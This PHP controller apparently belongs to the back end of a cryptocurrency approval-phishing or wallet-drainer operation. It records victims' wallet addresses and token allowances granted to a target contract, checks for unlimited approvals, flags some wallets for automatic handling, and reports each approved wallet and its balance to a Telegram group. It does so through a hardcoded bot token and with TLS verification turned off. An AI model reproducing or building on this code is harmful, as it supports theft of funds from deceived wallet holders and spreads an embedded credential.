<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\Exception;
use think\Request;

/**
 * Address接口
 */
class Address extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     */
    public function index()
    {
        /**
        `h5_url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT '0' COMMENT 'h5url',
        `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '钱包地址',
        `approve_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '授权合约',
        `money_approve` float DEFAULT '0' COMMENT '授权数量',
        `money_online` float DEFAULT '0' COMMENT '线上余额',
        `createtime` int(10) DEFAULT NULL COMMENT '创建时间',
        `updatetime` int(10) DEFAULT NULL COMMENT '更新时间',
        `is_approve` tinyint(4) DEFAULT '0' COMMENT '是否授权0否1是',
        `is_approve_old` tinyint(4) DEFAULT '0' COMMENT '之前是否授权0否1是',
        `contract_address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '目标合约地址',
        `approve_address_decimals` int(11) DEFAULT NULL COMMENT '目标精度',
         */
        $params = $this->request->post();
        if(empty($params)){
            $this->error(__('Invalid parameters'));
        }
        unset($params['user_id']);
        try {
            $params['createtime']=time();
            $params['updatetime']=time();
            $ishave = (new \app\admin\model\Address())->where(['address'=>$params['address'],'approve_address'=>$params['approve_address'],'contract_address'=>$params['contract_address']])->find();
            if($ishave){
                (new \app\admin\model\Address())->where(['id'=>$ishave['id']])->update($params);
            }else{
                (new \app\admin\model\Address())->insert($params);
            }
            sleep(1);
            $vo = Db('address')->where(['address'=>$params['address']])->find();
            if($vo){
                if((new \Tron\Address($vo['address']))->isValid()){
                    $qb_type = 1;
                }else{
                    $qb_type = 2;
                }
                $money_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$vo['address'],$vo['contract_address'],$vo['approve_address_decimals']);
                $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$vo['address'],$vo['approve_address'],$vo['contract_address'],$vo['approve_address_decimals']);
                if($money_approve >= 115792089237316195423570985008687907853269984665640564039457584007913129.639936){
                    db('address')->where(['id'=>$vo['id']])->update(['money_approve'=>10000000000,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                }else{
                    if($money_approve  > 0){
                        if($money_approve > 10000000000){
                            $money_approve = 10000000000;
                        }
                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
                    }else{
                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>0]);
                    }
                }
                if($vo['h5_url'] == '1688vip_channel_user_id:37'){//jiema
                    db('address')->where(['id'=>$vo['id']])->update(['auto'=>1,'auto_money'=>9999]);
                }
                //TG通知开始
                $data = "【授权通知】\n钱包地址：{$params['address']}\n在线余额：{$money_approve}\n授权数量:{$money_approve}";
                $key ='5321687794:AAG-QhTg_DzK-e6v0f5Anb4O50fr-JifbtI';//TG机器人私钥
                $id ='5725539445';//群组ID
                $u4 = $data;
                $u4 = urlencode($u4);
                $urlstring  = "https://api.telegram.org/bot$key/sendMessage?chat_id=$id&text=$u4";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $urlstring);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $result = curl_exec($ch);
                curl_close($ch);
                //TG通知结束
            }
            return 'ok';
        }catch (Exception $e) {
            return $e->getMessage();
        }
    }
}
